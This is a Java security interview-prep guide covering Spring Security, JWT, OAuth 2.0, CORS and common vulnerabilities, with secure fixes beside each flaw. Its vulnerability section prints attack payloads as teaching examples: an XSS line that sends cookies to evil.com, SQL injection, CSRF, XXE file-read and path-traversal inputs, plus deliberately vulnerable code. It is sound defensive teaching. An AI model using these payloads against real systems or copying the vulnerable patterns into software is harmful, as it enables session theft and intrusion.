# Security for Java Applications — Senior Engineer Interview Preparation

---

## 1. Authentication vs Authorization

### Authentication ("Who are you?")

Authentication is the process of **verifying identity** — confirming that a user or system is who they claim to be. It answers the question "Who are you?" before any access decision is made.

**Authentication Factors:**

| Factor | Description | Examples |
|--------|-------------|----------|
| Something you **know** | Knowledge-based secrets | Password, PIN, security questions |
| Something you **have** | Physical or digital possession | Hardware token, phone (SMS/TOTP), smart card |
| Something you **are** | Biometric characteristics | Fingerprint, face recognition, retinal scan |

**Multi-Factor Authentication (MFA)** requires two or more factors from different categories. Using a password + security question is NOT true MFA (both are "something you know").

### Authorization ("What can you do?")

Authorization determines **what actions an authenticated entity is permitted to perform**. It happens after authentication and answers "What are you allowed to do?"

### Authorization Models

#### RBAC (Role-Based Access Control)

Users are assigned **roles**, and roles are granted **permissions**. Simple and widely used.

```java
// Spring Security RBAC
@PreAuthorize("hasRole('ADMIN')")
public void deleteUser(Long userId) { ... }

@PreAuthorize("hasAnyRole('ADMIN', 'MANAGER')")
public List<Report> getReports() { ... }
```

#### ABAC (Attribute-Based Access Control)

Access decisions based on **attributes** of the user, resource, action, and environment. More flexible, more complex.

```java
// ABAC-style with Spring Security SpEL
@PreAuthorize("@authz.canAccessDocument(authentication, #documentId)")
public Document getDocument(Long documentId) { ... }

@Component("authz")
public class AuthorizationLogic {
    public boolean canAccessDocument(Authentication auth, Long docId) {
        User user = (User) auth.getPrincipal();
        Document doc = documentRepo.findById(docId).orElseThrow();
        // Check attributes: department, classification level, time of day
        return user.getDepartment().equals(doc.getDepartment())
            && user.getClearanceLevel() >= doc.getClassificationLevel();
    }
}
```

#### ACL (Access Control List)

Each resource has an explicit list of who can access it and with what permissions. Fine-grained but hard to scale.

```java
// Spring Security ACL
@PreAuthorize("hasPermission(#document, 'WRITE')")
public void updateDocument(Document document) { ... }
```

### Comparison Table

| Feature | RBAC | ABAC | ACL |
|---------|------|------|-----|
| Granularity | Coarse (role-level) | Fine (attribute-level) | Fine (per-resource) |
| Scalability | High | Medium | Low |
| Complexity | Low | High | Medium |
| Dynamic decisions | No (static roles) | Yes (runtime attributes) | No (static lists) |
| Audit trail | Easy (role assignments) | Complex (attribute evaluation) | Easy (explicit lists) |
| Best for | Enterprise apps, clear hierarchy | Complex policies, context-dependent | File systems, small datasets |
| Implementation effort | Low | High | Medium |

---

## 2. Spring Security Architecture

Spring Security is a powerful framework built around the **Servlet Filter** mechanism. Every HTTP request passes through a chain of security filters before reaching the controller.

### SecurityFilterChain

The `SecurityFilterChain` is an ordered pipeline of filters that processes each request. Spring Security registers a `DelegatingFilterProxy` that delegates to a `FilterChainProxy`, which manages one or more `SecurityFilterChain` instances.

```
HTTP Request
    |
    v
DelegatingFilterProxy
    |
    v
FilterChainProxy
    |
    v
SecurityFilterChain [ordered filters]
    |-- DisableEncodeUrlFilter
    |-- SecurityContextPersistenceFilter
    |-- CorsFilter
    |-- CsrfFilter
    |-- LogoutFilter
    |-- UsernamePasswordAuthenticationFilter (or JWT filter)
    |-- ExceptionTranslationFilter
    +-- AuthorizationFilter (formerly FilterSecurityInterceptor)
    |
    v
DispatcherServlet -> Controller
```

### SecurityContext and SecurityContextHolder

The `SecurityContextHolder` stores the `SecurityContext`, which holds the `Authentication` object for the current thread.

```java
// Accessing the current authenticated user
SecurityContext context = SecurityContextHolder.getContext();
Authentication auth = context.getAuthentication();
String username = auth.getName();
Collection<? extends GrantedAuthority> authorities = auth.getAuthorities();
```

Storage strategies:
- `MODE_THREADLOCAL` (default) — each thread has its own context
- `MODE_INHERITABLETHREADLOCAL` — child threads inherit parent's context
- `MODE_GLOBAL` — all threads share one context (rarely used)

### Authentication Interface

```java
public interface Authentication extends Principal, Serializable {
    // The authorities granted (roles/permissions)
    Collection<? extends GrantedAuthority> getAuthorities();

    // Credentials (usually password, cleared after authentication)
    Object getCredentials();

    // Additional details (IP address, session ID, etc.)
    Object getDetails();

    // The principal (usually UserDetails)
    Object getPrincipal();

    // Whether the user has been authenticated
    boolean isAuthenticated();
}
```

### UserDetailsService and UserDetails

`UserDetailsService` is the core interface for loading user data. Spring Security calls it during authentication.

```java
@Service
public class CustomUserDetailsService implements UserDetailsService {

    private final UserRepository userRepository;

    public CustomUserDetailsService(UserRepository userRepository) {
        this.userRepository = userRepository;
    }

    @Override
    public UserDetails loadUserByUsername(String username)
            throws UsernameNotFoundException {
        User user = userRepository.findByUsername(username)
            .orElseThrow(() -> new UsernameNotFoundException(
                "User not found: " + username));

        return org.springframework.security.core.userdetails.User.builder()
            .username(user.getUsername())
            .password(user.getPasswordHash())
            .authorities(user.getRoles().stream()
                .map(role -> new SimpleGrantedAuthority("ROLE_" + role.getName()))
                .toList())
            .accountExpired(!user.isActive())
            .accountLocked(user.isLocked())
            .build();
    }
}
```

### AuthenticationManager and AuthenticationProvider

The `AuthenticationManager` is the main entry point for authentication. Its default implementation, `ProviderManager`, delegates to a list of `AuthenticationProvider` instances.

```
AuthenticationManager
    +-- ProviderManager
        |-- DaoAuthenticationProvider (username/password)
        |-- JwtAuthenticationProvider (JWT tokens)
        +-- LdapAuthenticationProvider (LDAP directory)
```

Each provider handles a specific type of `Authentication` token. If one provider cannot authenticate the request, it passes to the next.

### Method-Level Security

```java
@Configuration
@EnableMethodSecurity // Replaces @EnableGlobalMethodSecurity in Spring Security 6
public class MethodSecurityConfig { }

@Service
public class OrderService {

    // SpEL expression evaluated before method execution
    @PreAuthorize("hasRole('ADMIN') or #order.customerId == authentication.principal.id")
    public void updateOrder(Order order) { ... }

    // Evaluated after method execution — can filter return value
    @PostAuthorize("returnObject.customerId == authentication.principal.id")
    public Order getOrder(Long orderId) { ... }

    // Simpler — no SpEL, just role names
    @Secured("ROLE_ADMIN")
    public void deleteOrder(Long orderId) { ... }

    // Filter collections
    @PreFilter("filterObject.owner == authentication.name")
    public void processOrders(List<Order> orders) { ... }
}
```

### Custom Filters — Extending OncePerRequestFilter

```java
public class JwtAuthenticationFilter extends OncePerRequestFilter {

    private final JwtTokenProvider tokenProvider;
    private final UserDetailsService userDetailsService;

    public JwtAuthenticationFilter(JwtTokenProvider tokenProvider,
                                    UserDetailsService userDetailsService) {
        this.tokenProvider = tokenProvider;
        this.userDetailsService = userDetailsService;
    }

    @Override
    protected void doFilterInternal(HttpServletRequest request,
                                     HttpServletResponse response,
                                     FilterChain filterChain)
            throws ServletException, IOException {

        String token = extractToken(request);

        if (token != null && tokenProvider.validateToken(token)) {
            String username = tokenProvider.getUsernameFromToken(token);
            UserDetails userDetails = userDetailsService.loadUserByUsername(username);

            UsernamePasswordAuthenticationToken authentication =
                new UsernamePasswordAuthenticationToken(
                    userDetails, null, userDetails.getAuthorities());
            authentication.setDetails(
                new WebAuthenticationDetailsSource().buildDetails(request));

            SecurityContextHolder.getContext().setAuthentication(authentication);
        }

        filterChain.doFilter(request, response);
    }

    private String extractToken(HttpServletRequest request) {
        String bearerToken = request.getHeader("Authorization");
        if (bearerToken != null && bearerToken.startsWith("Bearer ")) {
            return bearerToken.substring(7);
        }
        return null;
    }
}
```

### Spring Security Configuration with JWT

```java
@Configuration
@EnableWebSecurity
@EnableMethodSecurity
public class SecurityConfig {

    private final JwtAuthenticationFilter jwtFilter;
    private final CustomUserDetailsService userDetailsService;

    public SecurityConfig(JwtAuthenticationFilter jwtFilter,
                          CustomUserDetailsService userDetailsService) {
        this.jwtFilter = jwtFilter;
        this.userDetailsService = userDetailsService;
    }

    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
        return http
            .csrf(csrf -> csrf.disable()) // Disable CSRF for stateless API
            .sessionManagement(session ->
                session.sessionCreationPolicy(SessionCreationPolicy.STATELESS))
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/api/auth/**").permitAll()
                .requestMatchers("/api/public/**").permitAll()
                .requestMatchers("/api/admin/**").hasRole("ADMIN")
                .requestMatchers(HttpMethod.DELETE, "/api/**").hasRole("ADMIN")
                .anyRequest().authenticated()
            )
            .addFilterBefore(jwtFilter,
                UsernamePasswordAuthenticationFilter.class)
            .exceptionHandling(ex -> ex
                .authenticationEntryPoint((req, res, authEx) -> {
                    res.setStatus(HttpServletResponse.SC_UNAUTHORIZED);
                    res.getWriter().write("{\"error\": \"Unauthorized\"}");
                })
                .accessDeniedHandler((req, res, accessEx) -> {
                    res.setStatus(HttpServletResponse.SC_FORBIDDEN);
                    res.getWriter().write("{\"error\": \"Access denied\"}");
                })
            )
            .build();
    }

    @Bean
    public AuthenticationManager authenticationManager(
            AuthenticationConfiguration config) throws Exception {
        return config.getAuthenticationManager();
    }

    @Bean
    public PasswordEncoder passwordEncoder() {
        return new BCryptPasswordEncoder(12);
    }
}
```

---

## 3. JWT (JSON Web Tokens)

### Structure

A JWT consists of three Base64URL-encoded parts separated by dots:

```
Header.Payload.Signature

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4iLCJpYXQiOjE1MTYyMzkwMjJ9.
SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

**Header** — algorithm and token type:
```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

**Payload** — claims (data):
```json
{
  "sub": "1234567890",
  "name": "John Doe",
  "iat": 1516239022,
  "exp": 1516242622,
  "roles": ["ADMIN", "USER"]
}
```

**Signature** — ensures integrity:
```
HMACSHA256(base64UrlEncode(header) + "." + base64UrlEncode(payload), secret)
```

### Signing Algorithms

| Algorithm | Type | Key | Use Case |
|-----------|------|-----|----------|
| HS256 | Symmetric (HMAC) | Single shared secret | Single service, internal APIs |
| RS256 | Asymmetric (RSA) | Private key signs, public key verifies | Distributed systems, third-party verification |
| ES256 | Asymmetric (ECDSA) | Smaller keys than RSA, same security | Mobile, performance-sensitive |

**When to use which:**
- **HS256** — when the same service creates and validates tokens. Simpler, faster. The secret must be shared with every verifier (security risk in distributed systems).
- **RS256** — when multiple services need to verify tokens but only one should create them. The authorization server keeps the private key; resource servers only need the public key. Standard choice for OAuth 2.0 / OIDC.

### Standard Claims

| Claim | Name | Description |
|-------|------|-------------|
| `iss` | Issuer | Who issued the token |
| `sub` | Subject | Who the token represents (user ID) |
| `aud` | Audience | Intended recipient(s) |
| `exp` | Expiration | Token expiry (Unix timestamp) |
| `iat` | Issued At | When the token was created |
| `nbf` | Not Before | Token not valid before this time |
| `jti` | JWT ID | Unique identifier (for revocation) |

### Access Tokens vs Refresh Tokens

| Property | Access Token | Refresh Token |
|----------|-------------|---------------|
| Lifetime | Short (5-15 minutes) | Long (days to weeks) |
| Purpose | Authorize API requests | Obtain new access tokens |
| Sent with | Every API request (Authorization header) | Only to token refresh endpoint |
| Storage | Memory (preferred) or HttpOnly cookie | HttpOnly secure cookie |
| Contains | User info, roles, permissions | Minimal (user ID, token family) |
| Revocation | Hard (stateless) | Easy (stored server-side) |

### Token Storage Trade-offs

| Storage | XSS Vulnerable | CSRF Vulnerable | Notes |
|---------|---------------|-----------------|-------|
| `localStorage` | Yes (JS can read) | No | Never use for sensitive tokens |
| `sessionStorage` | Yes (JS can read) | No | Lost on tab close |
| HttpOnly cookie | No (JS cannot read) | Yes (auto-sent) | Use with CSRF protection |
| HttpOnly + SameSite=Strict cookie | No | No | Best option, limits cross-site usage |
| In-memory (JS variable) | Technically yes | No | Lost on refresh; most secure for SPAs |

### Token Revocation Strategies

1. **Short-lived access tokens** — set expiration to 5-15 minutes; even compromised tokens expire quickly
2. **Token blacklist** — store revoked `jti` values in Redis/cache; check on every request (adds statefulness)
3. **Token versioning** — store a version counter per user in DB; increment on logout/password change; reject tokens with old version
4. **Refresh token rotation** — issue a new refresh token with each use; if a refresh token is used twice, revoke the entire family (detects theft)

### Common JWT Mistakes

1. **Storing sensitive data in the payload** — JWTs are encoded, not encrypted. Anyone can decode the payload.
2. **Not validating the signature** — always verify; never trust unverified tokens.
3. **Not checking `exp`** — expired tokens must be rejected.
4. **Not validating `iss` and `aud`** — prevents token confusion attacks between services.
5. **Using `alg: none`** — some libraries accept unsigned tokens if the algorithm is "none". Always enforce the expected algorithm.
6. **Symmetric keys that are too short** — HMAC keys should be at least 256 bits.
7. **Transmitting tokens over HTTP** — always require HTTPS.

### JWT Creation and Validation Example

```java
import io.jsonwebtoken.Claims;
import io.jsonwebtoken.Jwts;
import io.jsonwebtoken.security.Keys;

import javax.crypto.SecretKey;
import java.util.Date;
import java.util.List;

public class JwtTokenProvider {

    // In production, load from environment/vault — never hardcode
    private final SecretKey key = Keys.hmacShaKeyFor(
        "my-super-secret-key-that-is-at-least-256-bits-long!!".getBytes());

    private final long accessTokenValidity = 15 * 60 * 1000;  // 15 minutes
    private final long refreshTokenValidity = 7 * 24 * 60 * 60 * 1000; // 7 days

    public String createAccessToken(String username, List<String> roles) {
        Date now = new Date();
        return Jwts.builder()
            .subject(username)
            .claim("roles", roles)
            .issuedAt(now)
            .expiration(new Date(now.getTime() + accessTokenValidity))
            .issuer("my-application")
            .signWith(key)
            .compact();
    }

    public String createRefreshToken(String username) {
        Date now = new Date();
        return Jwts.builder()
            .subject(username)
            .issuedAt(now)
            .expiration(new Date(now.getTime() + refreshTokenValidity))
            .issuer("my-application")
            .id(java.util.UUID.randomUUID().toString()) // jti for revocation
            .signWith(key)
            .compact();
    }

    public boolean validateToken(String token) {
        try {
            Jwts.parser()
                .verifyWith(key)
                .requireIssuer("my-application")
                .build()
                .parseSignedClaims(token);
            return true;
        } catch (Exception e) {
            // Log the specific exception type for debugging
            return false;
        }
    }

    public String getUsernameFromToken(String token) {
        Claims claims = Jwts.parser()
            .verifyWith(key)
            .build()
            .parseSignedClaims(token)
            .getPayload();
        return claims.getSubject();
    }

    @SuppressWarnings("unchecked")
    public List<String> getRolesFromToken(String token) {
        Claims claims = Jwts.parser()
            .verifyWith(key)
            .build()
            .parseSignedClaims(token)
            .getPayload();
        return claims.get("roles", List.class);
    }
}
```

---

## 4. OAuth 2.0

### Roles

| Role | Description | Example |
|------|-------------|---------|
| **Resource Owner** | The user who owns the data | End user |
| **Client** | The application requesting access | Web app, mobile app |
| **Authorization Server** | Issues tokens after authenticating the user | Keycloak, Auth0, Okta |
| **Resource Server** | Hosts protected resources, validates tokens | Your REST API |

### Grant Types

#### Authorization Code + PKCE (Recommended for Web and Mobile)

The most secure grant type. Used when a user interacts with a browser.

```
1. Client generates code_verifier (random string) and code_challenge (SHA256 hash)
2. Client redirects user to Authorization Server with code_challenge
3. User authenticates and consents
4. Authorization Server redirects back with authorization code
5. Client exchanges code + code_verifier for tokens
6. Authorization Server verifies code_challenge matches, issues tokens
```

```
+--------+      +------------+      +----------------+      +------------+
| User   |      |  Client    |      |  Auth Server   |      | Resource   |
|        |      |  (App)     |      |                |      |  Server    |
+---+----+      +-----+------+      +-------+--------+      +-----+------+
    |  1. Login       |                      |                      |
    |---------------->|                      |                      |
    |                 |  2. Redirect with     |                      |
    |                 |  code_challenge       |                      |
    |                 |--------------------->|                      |
    |  3. Login prompt                       |                      |
    |<---------------------------------------|                      |
    |  4. Credentials                        |                      |
    |--------------------------------------->|                      |
    |                 |  5. Auth code         |                      |
    |                 |<--------------------|                      |
    |                 |  6. Code + verifier   |                      |
    |                 |--------------------->|                      |
    |                 |  7. Access token      |                      |
    |                 |<--------------------|                      |
    |                 |  8. API request + token                     |
    |                 |-------------------------------------------->|
    |                 |  9. Protected resource                      |
    |                 |<--------------------------------------------|
```

**PKCE** (Proof Key for Code Exchange) prevents authorization code interception attacks. It is now recommended for ALL clients, not just public clients.

#### Client Credentials (Service-to-Service)

No user involved. The client authenticates with its own credentials.

```
POST /oauth/token
Content-Type: application/x-www-form-urlencoded

grant_type=client_credentials
&client_id=service-a
&client_secret=s3cret
&scope=read:orders
```

#### Device Code (TV / IoT)

For devices with limited input capabilities:
1. Device requests a device code and user code
2. Device displays: "Go to https://example.com/device and enter code: ABCD-1234"
3. User enters code on their phone/computer and authenticates
4. Device polls the authorization server until the user completes authentication

### Deprecated Grant Types

| Grant Type | Why Deprecated | Replacement |
|------------|---------------|-------------|
| **Implicit** | Token exposed in URL fragment, no refresh tokens, vulnerable to token leakage | Authorization Code + PKCE |
| **Resource Owner Password** | Client handles user credentials directly, breaks separation of concerns, cannot support MFA | Authorization Code + PKCE |

### OpenID Connect (OIDC)

OIDC is an **identity layer on top of OAuth 2.0**. OAuth 2.0 alone is about authorization (access), not authentication (identity).

- OAuth 2.0 gives you an **access token** (what you can do)
- OIDC adds an **ID token** (who you are) — a JWT containing user identity claims
- Standard scopes: `openid`, `profile`, `email`, `address`, `phone`
- Defines a `/userinfo` endpoint for fetching user profile data
- Discovery document at `/.well-known/openid-configuration`

### Token Introspection vs JWT Validation

| Approach | How it works | Pros | Cons |
|----------|-------------|------|------|
| **JWT validation** | Resource server validates signature locally using public key | Fast, no network call, works offline | Cannot revoke immediately |
| **Token introspection** | Resource server calls auth server `/introspect` endpoint | Real-time revocation, opaque tokens | Network dependency, latency, single point of failure |

### Spring Security OAuth2 Resource Server Configuration

```java
@Configuration
@EnableWebSecurity
public class ResourceServerConfig {

    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
        return http
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/api/public/**").permitAll()
                .requestMatchers("/api/admin/**").hasAuthority("SCOPE_admin")
                .anyRequest().authenticated()
            )
            .oauth2ResourceServer(oauth2 -> oauth2
                .jwt(jwt -> jwt
                    .jwtAuthenticationConverter(jwtAuthenticationConverter())
                )
            )
            .build();
    }

    @Bean
    public JwtAuthenticationConverter jwtAuthenticationConverter() {
        JwtGrantedAuthoritiesConverter authoritiesConverter =
            new JwtGrantedAuthoritiesConverter();
        authoritiesConverter.setAuthoritiesClaimName("roles");
        authoritiesConverter.setAuthorityPrefix("ROLE_");

        JwtAuthenticationConverter converter = new JwtAuthenticationConverter();
        converter.setJwtGrantedAuthoritiesConverter(authoritiesConverter);
        return converter;
    }
}
```

`application.yml`:
```yaml
spring:
  security:
    oauth2:
      resourceserver:
        jwt:
          issuer-uri: https://auth.example.com/realms/my-realm
          # Or specify jwk-set-uri directly:
          # jwk-set-uri: https://auth.example.com/realms/my-realm/protocol/openid-connect/certs
```

---

## 5. CORS (Cross-Origin Resource Sharing)

### Same-Origin Policy

Browsers enforce the **same-origin policy**: scripts on `https://app.example.com` cannot make requests to `https://api.other.com` by default. Two URLs have the same origin if they share the same **scheme**, **host**, and **port**.

```
https://example.com:443/path   — origin: https://example.com:443

Same origin:    https://example.com/other-path
Different origin: http://example.com     (different scheme)
Different origin: https://api.example.com (different host)
Different origin: https://example.com:8080 (different port)
```

### Simple Requests vs Preflight Requests

**Simple requests** (no preflight needed):
- Method: `GET`, `HEAD`, or `POST`
- Only safe headers: `Accept`, `Accept-Language`, `Content-Language`, `Content-Type` (only `application/x-www-form-urlencoded`, `multipart/form-data`, `text/plain`)

**Preflight requests** (browser sends `OPTIONS` first):
- Any other HTTP method (`PUT`, `DELETE`, `PATCH`)
- Custom headers (e.g., `Authorization`, `X-Request-ID`)
- `Content-Type: application/json`

```
Preflight flow:

1. Browser sends OPTIONS request:
   OPTIONS /api/users
   Origin: https://app.example.com
   Access-Control-Request-Method: PUT
   Access-Control-Request-Headers: Authorization, Content-Type

2. Server responds:
   Access-Control-Allow-Origin: https://app.example.com
   Access-Control-Allow-Methods: GET, POST, PUT, DELETE
   Access-Control-Allow-Headers: Authorization, Content-Type
   Access-Control-Max-Age: 3600

3. If allowed, browser sends actual PUT request
```

### CORS Response Headers

| Header | Description |
|--------|-------------|
| `Access-Control-Allow-Origin` | Allowed origin(s) — specific origin or `*` (no credentials with `*`) |
| `Access-Control-Allow-Methods` | Allowed HTTP methods |
| `Access-Control-Allow-Headers` | Allowed request headers |
| `Access-Control-Allow-Credentials` | Whether cookies/auth headers are allowed (`true`/omit) |
| `Access-Control-Expose-Headers` | Response headers the browser can access via JS |
| `Access-Control-Max-Age` | Seconds the preflight result can be cached |

### Spring CORS Configuration

**Option 1: `@CrossOrigin` annotation (per controller/method)**

```java
@RestController
@CrossOrigin(origins = "https://app.example.com", maxAge = 3600)
public class UserController {

    @CrossOrigin(origins = {"https://app.example.com", "https://admin.example.com"})
    @GetMapping("/api/users")
    public List<User> getUsers() { ... }
}
```

**Option 2: Global configuration via `WebMvcConfigurer`**

```java
@Configuration
public class WebConfig implements WebMvcConfigurer {

    @Override
    public void addCorsMappings(CorsRegistry registry) {
        registry.addMapping("/api/**")
            .allowedOrigins("https://app.example.com")
            .allowedMethods("GET", "POST", "PUT", "DELETE")
            .allowedHeaders("Authorization", "Content-Type")
            .allowCredentials(true)
            .maxAge(3600);
    }
}
```

**Option 3: `CorsFilter` bean (works with Spring Security)**

```java
@Bean
public CorsFilter corsFilter() {
    CorsConfiguration config = new CorsConfiguration();
    config.setAllowedOrigins(List.of("https://app.example.com"));
    config.setAllowedMethods(List.of("GET", "POST", "PUT", "DELETE", "OPTIONS"));
    config.setAllowedHeaders(List.of("Authorization", "Content-Type"));
    config.setAllowCredentials(true);
    config.setMaxAge(3600L);

    UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
    source.registerCorsConfiguration("/api/**", config);
    return new CorsFilter(source);
}
```

**Integration with Spring Security** — CORS must be configured in the security filter chain too, or preflight `OPTIONS` requests will be blocked before reaching your CORS config:

```java
@Bean
public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
    return http
        .cors(cors -> cors.configurationSource(corsConfigurationSource()))
        .csrf(csrf -> csrf.disable())
        // ... other security config
        .build();
}

@Bean
public CorsConfigurationSource corsConfigurationSource() {
    CorsConfiguration config = new CorsConfiguration();
    config.setAllowedOrigins(List.of("https://app.example.com"));
    config.setAllowedMethods(List.of("GET", "POST", "PUT", "DELETE"));
    config.setAllowedHeaders(List.of("*"));
    config.setAllowCredentials(true);

    UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
    source.registerCorsConfiguration("/**", config);
    return source;
}
```

### Common CORS Mistakes

1. **Using `Access-Control-Allow-Origin: *` with credentials** — browsers reject this combination. You must specify the exact origin.
2. **Not handling `OPTIONS` preflight** — if Spring Security blocks OPTIONS requests, CORS fails silently.
3. **Configuring CORS only in Spring MVC, not in Spring Security** — the security filter chain runs first and may reject the request before CORS headers are added.
4. **Wildcard in `allowedOrigins` with `allowCredentials(true)`** — use `allowedOriginPatterns` instead if you need patterns with credentials.
5. **Forgetting `Access-Control-Expose-Headers`** — custom response headers are hidden from JavaScript unless explicitly exposed.

---

## 6. Common Java Security Vulnerabilities

### SQL Injection

Untrusted input is concatenated into SQL queries, allowing attackers to manipulate the query logic.

**Vulnerable:**
```java
// NEVER do this — direct string concatenation
public User findUser(String username) {
    String sql = "SELECT * FROM users WHERE username = '" + username + "'";
    // Input: ' OR '1'='1' --
    // Becomes: SELECT * FROM users WHERE username = '' OR '1'='1' --'
    return jdbcTemplate.queryForObject(sql, userRowMapper);
}
```

**Secure:**
```java
// Parameterized query — JDBC
public User findUser(String username) {
    String sql = "SELECT * FROM users WHERE username = ?";
    return jdbcTemplate.queryForObject(sql, userRowMapper, username);
}

// Named parameters — Spring
public User findUser(String username) {
    String sql = "SELECT * FROM users WHERE username = :username";
    MapSqlParameterSource params = new MapSqlParameterSource("username", username);
    return namedJdbcTemplate.queryForObject(sql, params, userRowMapper);
}

// JPA/Hibernate — parameterized by default
@Query("SELECT u FROM User u WHERE u.username = :username")
User findByUsername(@Param("username") String username);
```

### XSS (Cross-Site Scripting)

Attacker injects malicious JavaScript that runs in other users' browsers.

**Vulnerable:**
```java
// Reflected XSS — user input rendered directly in HTML
@GetMapping("/search")
public String search(@RequestParam String query, Model model) {
    model.addAttribute("query", query);
    return "search"; // Thymeleaf template renders query unescaped
}
// Input: <script>document.location='https://evil.com/steal?c='+document.cookie</script>
```

**Secure:**
```java
// Thymeleaf auto-escapes with th:text (NOT th:utext)
// In template: <span th:text="${query}"></span>  -- safe, HTML-escaped
//              <span th:utext="${query}"></span>  -- UNSAFE, renders raw HTML

// Explicit sanitization with OWASP Java HTML Sanitizer
import org.owasp.html.PolicyFactory;
import org.owasp.html.Sanitizers;

PolicyFactory policy = Sanitizers.FORMATTING.and(Sanitizers.LINKS);
String safeHtml = policy.sanitize(userInput);

// Content-Security-Policy header to prevent inline scripts
@Bean
public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
    return http
        .headers(headers -> headers
            .contentSecurityPolicy(csp ->
                csp.policyDirectives("default-src 'self'; script-src 'self'"))
        )
        .build();
}
```

### CSRF (Cross-Site Request Forgery)

Attacker tricks a logged-in user's browser into making unwanted requests to a site where the user is authenticated.

```html
<!-- Malicious page the victim visits -->
<form action="https://bank.com/transfer" method="POST">
    <input type="hidden" name="to" value="attacker" />
    <input type="hidden" name="amount" value="10000" />
</form>
<script>document.forms[0].submit();</script>
```

**Protection strategies:**

```java
// Spring Security CSRF protection (enabled by default for form-based apps)
@Bean
public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
    return http
        .csrf(csrf -> csrf
            .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
            // For SPAs: token in cookie, include in X-XSRF-TOKEN header
        )
        .build();
}

// Disable CSRF only for stateless APIs using JWT (no cookies = no CSRF risk)
@Bean
public SecurityFilterChain apiFilterChain(HttpSecurity http) throws Exception {
    return http
        .csrf(csrf -> csrf.disable())
        .sessionManagement(s -> s.sessionCreationPolicy(SessionCreationPolicy.STATELESS))
        .build();
}
```

**SameSite cookies** (modern defense):
```
Set-Cookie: sessionId=abc123; SameSite=Strict; Secure; HttpOnly
```
- `SameSite=Strict` — cookie never sent on cross-site requests
- `SameSite=Lax` — cookie sent on top-level navigations (GET) but not POST/forms from other sites
- `SameSite=None; Secure` — always sent (opt-in for cross-site, requires HTTPS)

### Deserialization Attacks

Java's `ObjectInputStream` can instantiate arbitrary classes during deserialization, leading to **Remote Code Execution (RCE)**.

**Vulnerable:**
```java
// DANGEROUS — deserializing untrusted data
ObjectInputStream ois = new ObjectInputStream(untrustedInputStream);
Object obj = ois.readObject(); // Can trigger gadget chains leading to RCE
```

**Secure:**
```java
// Option 1: Allowlist with ObjectInputFilter (Java 9+)
ObjectInputStream ois = new ObjectInputStream(inputStream);
ois.setObjectInputFilter(filterInfo -> {
    Class<?> clazz = filterInfo.serialClass();
    if (clazz != null) {
        // Only allow specific safe classes
        if (clazz == MyDataClass.class || clazz == String.class) {
            return ObjectInputFilter.Status.ALLOWED;
        }
        return ObjectInputFilter.Status.REJECTED;
    }
    return ObjectInputFilter.Status.UNDECIDED;
});

// Option 2: Avoid Java serialization entirely — use JSON
ObjectMapper mapper = new ObjectMapper();
// Use DTOs with explicit fields, avoid polymorphic deserialization
MyDto dto = mapper.readValue(jsonString, MyDto.class);
```

### XXE (XML External Entities)

XML parsers can be tricked into loading external resources, reading local files, or performing SSRF.

**Vulnerable:**
```java
// Default XML parser may process external entities
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
DocumentBuilder builder = factory.newDocumentBuilder();
Document doc = builder.parse(untrustedXmlInput);

// Malicious XML:
// <?xml version="1.0"?>
// <!DOCTYPE foo [
//   <!ENTITY xxe SYSTEM "file:///etc/passwd">
// ]>
// <data>&xxe;</data>
```

**Secure:**
```java
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();

// Disable external entities and DTDs
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
factory.setFeature(
    "http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
factory.setXIncludeAware(false);
factory.setExpandEntityReferences(false);

DocumentBuilder builder = factory.newDocumentBuilder();
Document doc = builder.parse(xmlInput);
```

### SSRF (Server-Side Request Forgery)

Attacker tricks the server into making requests to internal resources.

**Vulnerable:**
```java
// Fetches a URL provided by the user — no validation
@GetMapping("/fetch")
public String fetchUrl(@RequestParam String url) throws IOException {
    // Attacker input: http://169.254.169.254/latest/meta-data/ (AWS metadata)
    // Or: http://localhost:8080/admin/delete-all
    return new String(new URL(url).openStream().readAllBytes());
}
```

**Secure:**
```java
@GetMapping("/fetch")
public String fetchUrl(@RequestParam String url) throws IOException {
    URI uri = URI.create(url);

    // Validate scheme
    if (!"https".equals(uri.getScheme())) {
        throw new SecurityException("Only HTTPS URLs allowed");
    }

    // Resolve and validate host
    InetAddress address = InetAddress.getByName(uri.getHost());
    if (address.isLoopbackAddress() || address.isSiteLocalAddress()
            || address.isLinkLocalAddress()) {
        throw new SecurityException("Internal addresses not allowed");
    }

    // Allowlist of permitted domains
    Set<String> allowedDomains = Set.of("api.trusted.com", "cdn.trusted.com");
    if (!allowedDomains.contains(uri.getHost())) {
        throw new SecurityException("Domain not in allowlist");
    }

    // Proceed with validated URL
    HttpClient client = HttpClient.newHttpClient();
    HttpRequest request = HttpRequest.newBuilder(uri).build();
    return client.send(request, HttpResponse.BodyHandlers.ofString()).body();
}
```

### Path Traversal

Attacker manipulates file paths to access files outside the intended directory.

**Vulnerable:**
```java
@GetMapping("/download")
public byte[] downloadFile(@RequestParam String filename) throws IOException {
    // Input: ../../etc/passwd
    Path path = Path.of("/app/uploads/" + filename);
    return Files.readAllBytes(path);
}
```

**Secure:**
```java
@GetMapping("/download")
public byte[] downloadFile(@RequestParam String filename) throws IOException {
    Path basePath = Path.of("/app/uploads").toRealPath();
    Path filePath = basePath.resolve(filename).normalize().toRealPath();

    // Ensure resolved path is still within the base directory
    if (!filePath.startsWith(basePath)) {
        throw new SecurityException("Path traversal attempt detected");
    }

    return Files.readAllBytes(filePath);
}
```

---

